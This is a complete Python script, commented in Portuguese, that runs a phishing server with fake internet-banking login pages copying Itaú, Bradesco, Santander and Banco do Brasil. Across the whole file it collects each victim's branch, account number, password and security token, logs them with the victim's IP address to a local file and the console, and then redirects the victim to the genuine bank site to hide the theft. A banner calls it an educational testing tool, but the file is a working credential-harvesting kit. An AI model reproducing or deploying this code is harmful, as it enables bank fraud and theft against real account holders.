#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import threading
import http.server
import socketserver
import json
import time
import random
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Configurações
PORT = 8080
HOST = "0.0.0.0"
DATA_FILE = "credenciais_bancarias.txt"
LOG_FILE = "servidor_banco.log"

# Cores para output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Template base HTML para bancos
BANK_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <link rel="shortcut icon" href="{favicon}" type="image/x-icon">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }}
        
        body {{
            background: {background};
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .login-container {{
            background: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 450px;
        }}
        
        .bank-header {{
            text-align: center;
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }}
        
        .bank-header h1 {{
            font-size: 24px;
            margin-bottom: 10px;
            color: {brand_color};
            font-weight: 600;
        }}
        
        .bank-header p {{
            color: #666;
            font-size: 14px;
        }}
        
        .bank-logo {{
            margin-bottom: 15px;
        }}
        
        .bank-logo img {{
            height: 50px;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        .form-group label {{
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #444;
            font-size: 14px;
        }}
        
        .form-group input {{
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 15px;
            transition: all 0.3s;
        }}
        
        .form-group input:focus {{
            outline: none;
            border-color: {brand_color};
            box-shadow: 0 0 0 2px {brand_color}20;
        }}
        
        .btn {{
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 6px;
            background: {brand_color};
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }}
        
        .btn:hover {{
            background: {hover_color};
        }}
        
        .footer {{
            text-align: center;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            font-size: 13px;
            color: #888;
        }}
        
        .footer a {{
            color: {brand_color};
            text-decoration: none;
        }}
        
        .footer a:hover {{
            text-decoration: underline;
        }}
        
        .security-alert {{
            background: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 13px;
            color: #5f6368;
            border-left: 4px solid {brand_color};
        }}
        
        .security-alert strong {{
            display: block;
            margin-bottom: 5px;
            color: {brand_color};
        }}
        
        .error-message {{
            color: #d93025;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            display: none;
            background: #fce8e6;
            padding: 12px;
            border-radius: 4px;
        }}
        
        .success-message {{
            color: #0f9d58;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            display: none;
            background: #e6f4ea;
            padding: 12px;
            border-radius: 4px;
        }}
        
        .two-factor {{
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }}
        
        .language-selector {{
            position: absolute;
            top: 20px;
            right: 20px;
        }}
        
        .language-selector select {{
            padding: 8px;
            border-radius: 4px;
            border: 1px solid #ddd;
            font-size: 13px;
        }}
        
        .bank-security {{
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 15px;
            gap: 10px;
        }}
        
        .bank-security img {{
            height: 20px;
        }}
    </style>
</head>
<body>
    <div class="language-selector">
        <select onchange="changeLanguage(this.value)">
            <option value="pt">Português</option>
            <option value="en">English</option>
        </select>
    </div>

    <div class="login-container">
        <div class="bank-header">
            <div class="bank-logo">
                <img src="{logo}" alt="{bank_name}">
            </div>
            <h1>{bank_name}</h1>
            <p>{welcome_message}</p>
        </div>
        
        <form id="loginForm" method="POST">
            <div class="form-group">
                <label for="agencia">{agencia_label}</label>
                <input type="text" id="agencia" name="agencia" required placeholder="{agencia_placeholder}">
            </div>
            
            <div class="form-group">
                <label for="conta">{conta_label}</label>
                <input type="text" id="conta" name="conta" required placeholder="{conta_placeholder}">
            </div>
            
            <div class="form-group">
                <label for="senha">{senha_label}</label>
                <input type="password" id="senha" name="senha" required placeholder="{senha_placeholder}">
            </div>
            
            <div class="form-group two-factor" id="twoFactor">
                <label for="token">Token de Segurança</label>
                <input type="text" id="token" name="token" placeholder="Digite o token do seu app">
            </div>
            
            <button type="submit" class="btn">{login_button}</button>
        </form>
        
        <div class="error-message" id="errorMessage">
            {error_message}
        </div>
        
        <div class="success-message" id="successMessage">
            {success_message}
        </div>
        
        <div class="security-alert">
            <strong>⚠️ Aviso de Segurança</strong>
            {security_message}
        </div>
        
        <div class="bank-security">
            <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23009900' d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z'/></svg>" alt="Seguro">
            <span>Conexão Segura • SSL</span>
        </div>
        
        <div class="footer">
            <p>{footer_text_1} <a href="#">{footer_link}</a></p>
            <p>© {current_year} {bank_name}. {footer_rights}</p>
        </div>
    </div>

    <script>
        function changeLanguage(lang) {{
            alert('Idioma alterado para ' + (lang === 'pt' ? 'Português' : 'English'));
        }}
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            // Simular verificação em duas etapas (40% das vezes)
            if (Math.random() < 0.4) {{
                document.getElementById('twoFactor').style.display = 'block';
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('successMessage').innerHTML = 'Enviamos um token para seu app. Digite-o abaixo.';
                document.getElementById('errorMessage').style.display = 'none';
            }} else {{
                // Mostrar mensagem de sucesso
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('errorMessage').style.display = 'none';
                
                // Simular processo de login
                setTimeout(function() {{
                    document.getElementById('loginForm').submit();
                }}, 2500);
            }}
        }});
    </script>
</body>
</html>
"""

# Templates específicos para cada banco
BANK_TEMPLATES = {
    "itau": {
        "title": "Itaú Unibanco - Internet Banking",
        "bank_name": "Itaú",
        "brand_color": "#EC7000",
        "hover_color": "#D45F00",
        "background": "#F5F5F5",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%23EC7000'>ITAU</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23EC7000' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Acesse sua conta Itaú",
        "agencia_label": "Agência",
        "agencia_placeholder": "Número da agência",
        "conta_label": "Conta",
        "conta_placeholder": "Número da conta",
        "senha_label": "Senha",
        "senha_placeholder": "Sua senha de internet banking",
        "login_button": "Acessar",
        "error_message": "Agência, conta ou senha incorretos. Tente novamente.",
        "success_message": "Autenticação bem-sucedida! Redirecionando...",
        "security_message": "Mantenha seus dados confidenciais. Não compartilhe sua senha com terceiros.",
        "footer_text_1": "Problemas para acessar?",
        "footer_link": "Ajuda",
        "footer_rights": "Todos os direitos reservados.",
        "path": "/itau"
    },
    "bradesco": {
        "title": "Bradesco Internet Banking",
        "bank_name": "Bradesco",
        "brand_color": "#CC092F",
        "hover_color": "#A80725",
        "background": "#F0F0F0",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%23CC092F'>BRADESCO</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23CC092F' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Faça login no Internet Banking",
        "agencia_label": "Agência",
        "agencia_placeholder": "Digite sua agência",
        "conta_label": "Conta",
        "conta_placeholder": "Digite sua conta",
        "senha_label": "Senha Eletrônica",
        "senha_placeholder": "Digite sua senha",
        "login_button": "Continuar",
        "error_message": "Dados incorretos. Verifique e tente novamente.",
        "success_message": "Login realizado com sucesso!",
        "security_message": "Seu acesso está protegido com criptografia de última geração.",
        "footer_text_1": "Esqueceu sua senha?",
        "footer_link": "Recuperar acesso",
        "footer_rights": "© Banco Bradesco S.A.",
        "path": "/bradesco"
    },
    "santander": {
        "title": "Santander Internet Banking",
        "bank_name": "Santander",
        "brand_color": "#EC0000",
        "hover_color": "#C40000",
        "background": "#F7F7F7",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%23EC0000'>SANTANDER</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23EC0000' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Acesse sua conta com segurança",
        "agencia_label": "Agência",
        "agencia_placeholder": "Número da agência",
        "conta_label": "Conta",
        "conta_placeholder": "Número da conta",
        "senha_label": "Senha",
        "senha_placeholder": "Digite sua senha",
        "login_button": "Entrar",
        "error_message": "Agência, conta ou senha inválidos.",
        "success_message": "Autenticando... Aguarde um momento.",
        "security_message": "Utilizamos tecnologia avançada para proteger suas informações.",
        "footer_text_1": "Primeiro acesso?",
        "footer_link": "Cadastre-se",
        "footer_rights": "Santander © 2023",
        "path": "/santander"
    },
    "bb": {
        "title": "Banco do Brasil - Internet Banking",
        "bank_name": "Banco do Brasil",
        "brand_color": "#0033A0",
        "hover_color": "#002A80",
        "background": "#F5F5F5",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%230033A0'>BANCO DO BRASIL</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%230033A0' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Internet Banking BB",
        "agencia_label": "Agência",
        "agencia_placeholder": "Digite a agência",
        "conta_label": "Conta",
        "conta_placeholder": "Digite a conta",
        "senha_label": "Senha",
        "senha_placeholder": "Digite sua senha de 8 dígitos",
        "login_button": "Continuar",
        "error_message": "Dados incorretos. Verifique e tente novamente.",
        "success_message": "Validando credenciais...",
        "security_message": "Seus dados estão protegidos pelas melhores práticas de segurança.",
        "footer_text_1": "Problemas com o acesso?",
        "footer_link": "Clique aqui",
        "footer_rights": "Banco do Brasil © 2023",
        "path": "/bb"
    }
}

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Log da requisição
        self.log_request()
        
        # Verificar se a rota corresponde a algum banco
        for bank, config in BANK_TEMPLATES.items():
            if self.path == config["path"] or self.path == config["path"] + "/":
                self.send_login_page(bank)
                return
                
        # Página inicial com lista de bancos
        if self.path == "/":
            self.send_index_page()
            return
            
        # Servir arquivos estáticos se existirem
        if self.path.endswith(('.css', '.js', '.png', '.jpg', '.ico')):
            super().do_GET()
            return
            
        # Página não encontrada
        self.send_error(404, "Página não encontrada")
        
    def do_POST(self):
        # Processar dados de login
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)
        
        # Extrair dados bancários
        agencia = form_data.get('agencia', [''])[0]
        conta = form_data.get('conta', [''])[0]
        senha = form_data.get('senha', [''])[0]
        token = form_data.get('token', [''])[0]
        
        # Determinar de qual banco veio o login
        bank = "unknown"
        for b, config in BANK_TEMPLATES.items():
            if self.path == config["path"]:
                bank = b
                break
                
        # Salvar dados
        self.save_credentials(bank, agencia, conta, senha, token)
        
        # Redirecionar para página oficial do banco
        redirect_url = self.get_redirect_url(bank)
        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()
        
    def send_login_page(self, bank):
        if bank not in BANK_TEMPLATES:
            self.send_error(404, "Banco não encontrado")
            return
            
        config = BANK_TEMPLATES[bank]
        current_year = datetime.now().year
        
        # Gerar HTML personalizado
        html_content = BANK_HTML.format(
            title=config["title"],
            bank_name=config["bank_name"],
            brand_color=config["brand_color"],
            hover_color=config["hover_color"],
            background=config["background"],
            logo=config["logo"],
            favicon=config["favicon"],
            welcome_message=config["welcome_message"],
            agencia_label=config["agencia_label"],
            agencia_placeholder=config["agencia_placeholder"],
            conta_label=config["conta_label"],
            conta_placeholder=config["conta_placeholder"],
            senha_label=config["senha_label"],
            senha_placeholder=config["senha_placeholder"],
            login_button=config["login_button"],
            error_message=config["error_message"],
            success_message=config["success_message"],
            security_message=config["security_message"],
            footer_text_1=config["footer_text_1"],
            footer_link=config["footer_link"],
            footer_rights=config["footer_rights"],
            current_year=current_year
        )
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def send_index_page(self):
        html_content = """
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Internet Banking - Acesso Seguro</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #1a2a6c, #2a4b8c);
                    color: #fff;
                    min-height: 100vh;
                    padding: 40px 20px;
                }
                
                .container {
                    max-width: 1000px;
                    margin: 0 auto;
                }
                
                header {
                    text-align: center;
                    margin-bottom: 40px;
                }
                
                header h1 {
                    font-size: 36px;
                    margin-bottom: 10px;
                }
                
                header p {
                    font-size: 18px;
                    opacity: 0.9;
                }
                
                .security-badge {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 15px;
                    border-radius: 8px;
                    margin: 20px auto;
                    max-width: 500px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 10px;
                }
                
                .security-badge img {
                    height: 30px;
                }
                
                .banks-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
                    gap: 20px;
                    margin-top: 30px;
                }
                
                .bank-card {
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 12px;
                    padding: 25px;
                    text-align: center;
                    transition: transform 0.3s, box-shadow 0.3s;
                    cursor: pointer;
                    backdrop-filter: blur(10px);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                }
                
                .bank-card:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
                    background: rgba(255, 255, 255, 0.15);
                }
                
                .bank-card h2 {
                    margin: 15px 0;
                    font-size: 20px;
                }
                
                .bank-card a {
                    display: inline-block;
                    padding: 10px 20px;
                    background: #fff;
                    color: #1a2a6c;
                    text-decoration: none;
                    border-radius: 6px;
                    font-weight: bold;
                    transition: background 0.3s;
                }
                
                .bank-card a:hover {
                    background: #eee;
                }
                
                footer {
                    text-align: center;
                    margin-top: 50px;
                    opacity: 0.7;
                    font-size: 14px;
                }
                
                .disclaimer {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 15px;
                    border-radius: 8px;
                    margin-top: 30px;
                    font-size: 13px;
                    text-align: center;
                }
                
                @media (max-width: 768px) {
                    .banks-grid {
                        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1>Internet Banking</h1>
                    <p>Selecione seu banco para acessar sua conta</p>
                    
                    <div class="security-badge">
                        <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%2300ff00' d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z'/></svg>" alt="Seguro">
                        <span>Conexão Segura • Criptografia SSL</span>
                    </div>
                </header>
                
                <div class="banks-grid">
        """
        
        # Adicionar cards para cada banco
        for bank, config in BANK_TEMPLATES.items():
            html_content += f"""
                    <div class="bank-card">
                        <h2>{config['bank_name']}</h2>
                        <a href="{config['path']}">Acessar Internet Banking</a>
                    </div>
            """
        
        html_content += """
                </div>
                
                <div class="disclaimer">
                    <p>⚠️ <strong>Aviso de Segurança:</strong> Mantenha suas credenciais em local seguro. 
                    Nunca compartilhe sua senha com terceiros.</p>
                </div>
                
                <footer>
                    <p>© 2023 Sistema de Internet Banking. Todos os direitos reservados.</p>
                </footer>
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def save_credentials(self, bank, agencia, conta, senha, token=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = self.client_address[0]
        
        data = f"[{timestamp}] [{ip_address}] [{bank}] Ag: {agencia} | C/C: {conta} | Senha: {senha}"
        if token:
            data += f" | Token: {token}"
        data += "\n"
        
        # Salvar em arquivo
        with open(DATA_FILE, "a", encoding="utf-8") as f:
            f.write(data)
            
        # Log no console
        print(f"{Colors.GREEN}[+] {Colors.RESET}Credenciais capturadas - {bank}: Ag.{agencia} C/C.{conta}")
        print(f"{Colors.GREEN}[+] {Colors.RESET}Senha: {senha}")
        if token:
            print(f"{Colors.CYAN}[+] {Colors.RESET}Token: {token}")
        
    def get_redirect_url(self, bank):
        # URLs oficiais de redirecionamento para cada banco
        redirect_urls = {
            "itau": "https://www.itau.com.br/",
            "bradesco": "https://www.bradesco.com.br/",
            "santander": "https://www.santander.com.br/",
            "bb": "https://www.bb.com.br/",
            "unknown": "https://www.bcb.gov.br/"
        }
        
        return redirect_urls.get(bank, redirect_urls["unknown"])
        
    def log_message(self, format, *args):
        # Personalizar logs
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = format % args
        log_entry = f"[{timestamp}] {message}\n"
        
        # Salvar log em arquivo
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        # Exibir log colorido no console
        if "200" in message:
            color = Colors.GREEN
        elif "302" in message:
            color = Colors.CYAN
        elif "404" in message:
            color = Colors.RED
        else:
            color = Colors.YELLOW
            
        print(f"{color}[{timestamp}] {message}{Colors.RESET}")

class BankPhisher:
    def __init__(self):
        self.host = HOST
        self.port = PORT
        self.httpd = None
        
    def start_server(self):
        try:
            with socketserver.TCPServer((self.host, self.port), PhishingHandler) as httpd:
                self.httpd = httpd
                print(f"{Colors.GREEN}[+] {Colors.RESET}Servidor iniciado em http://{self.host}:{self.port}")
                print(f"{Colors.GREEN}[+] {Colors.RESET}Páginas disponíveis:")
                
                for bank, config in BANK_TEMPLATES.items():
                    print(f"{Colors.BLUE}    {config['path']} {Colors.RESET}- {config['bank_name']}")
                
                print(f"\n{Colors.YELLOW}[!] {Colors.RESET}Pressione Ctrl+C para parar o servidor")
                
                try:
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print(f"\n{Colors.RED}[-] {Colors.RESET}Parando servidor...")
                    
        except Exception as e:
            print(f"{Colors.RED}[-] {Colors.RESET}Erro ao iniciar servidor: {e}")
            
    def get_local_ip(self):
        try:
            # Obter IP local
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def get_public_ip(self):
        try:
            # Tentar obter IP público
            import requests
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Não disponível"

def main():
    print(f"""{Colors.PURPLE}
    ██████╗  █████╗ ███╗   ██╗██╗  ██╗         ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
    ██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝         ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
    ██████╔╝███████║██╔██╗ ██║█████╔╝          ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
    ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗          ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
    ██████╔╝██║  ██║██║ ╚████║██║  ██╗███████╗ ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
    {Colors.RESET}""")
    
    print(f"{Colors.CYAN}    Bank Phisher - Ferramenta educacional para testes de segurança bancária{Colors.RESET}\n")
    
    # Verificar se é root (para portas baixas)
    if os.geteuid() == 0 and PORT < 1024:
        print(f"{Colors.YELLOW}[!] {Colors.RESET}Executando como root para usar porta {PORT}")
    else:
        if PORT < 1024 and os.geteuid() != 0:
            print(f"{Colors.RED}[-] {Colors.RESET}Portas abaixo de 1024 requerem privilégios de root")
            sys.exit(1)
    
    # Mostrar informações de rede
    phisher = BankPhisher()
    local_ip = phisher.get_local_ip()
    public_ip = phisher.get_public_ip()
    
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Local: {local_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Público: {public_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Porta: {PORT}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Arquivo de dados: {DATA_FILE}\n")
    
    # Iniciar servidor
    phisher.start_server()

if __name__ == "__main__":
    main()
